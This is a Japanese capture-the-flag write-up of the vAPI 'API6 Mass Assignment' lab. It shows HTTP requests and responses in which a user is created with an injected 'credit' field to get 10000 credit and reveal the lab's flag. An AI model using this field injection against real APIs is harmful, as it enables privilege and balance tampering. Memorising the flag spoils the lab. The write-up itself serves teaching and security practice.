# API6 Mass Assignment
APIはクライアントから受け取った入力値を信頼し、チェックせずにDBへ書き込むことがある。  
攻撃者は、APIドキュメント、知識に基づいた推測、またはHTTPレスポンスから追加のオブジェクトを見つけ、  
それをリクエストに追加して、制限された機能へ不正にアクセスすることがある。

Create UserするとID4が返ってくる。
```http
POST /vapi/api6/user HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: da71bcc5-178a-4821-a8b9-276c64bbf29f
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 71

{
    "name":"x270",
    "username":"x270",
    "password":"x270"
}
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:12:20 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:12:20 GMT
Content-Type: application/json

{"name":"x270","username":"x270","id":4}
```

ID4の情報をGet Userで確認すると、creditが0となっている。
```http
GET /vapi/api6/user/me HTTP/1.1
Authorization-Token: eDI3MDp4Mjcw
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 3cd4c4f4-200d-4407-815d-de939c36865e
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close

```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:13:03 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:13:03 GMT
Content-Type: application/json

{"id":4,"name":"x270","username":"x270","credit":"0"}
```

User Createの際にパラメータcreditを追加するとどうなるだろうか。
```http
POST /vapi/api6/user HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: dbbce60a-ff47-4a82-b551-60300b455bb3
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 100

{
    "name":"x270-2",
    "username":"x270-2",
    "password":"x270-2",
    "credit":"10000"
}
```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:16:33 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:16:33 GMT
Content-Type: application/json

{"name":"x270-2","username":"x270-2","id":6}
```
```http
GET /vapi/api6/user/me HTTP/1.1
Authorization-Token: eDI3MC0yOngyNzAtMg==
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 13190ba6-2e63-45ae-952e-ea88fc7d395a
Host: localhost
Accept-Encoding: gzip, deflate
Connection: close

```
```http
HTTP/1.1 200 OK
Host: localhost
Date: Sat, 05 Mar 2022 14:16:37 GMT
Connection: close
X-Powered-By: PHP/7.4.7
Cache-Control: no-cache, private
Date: Sat, 05 Mar 2022 14:16:37 GMT
Content-Type: application/json

{"id":6,"name":"x270-2","username":"x270-2","credit":"10000","flag":"flag{api6_afb969db8b6e272694b4}"}
```
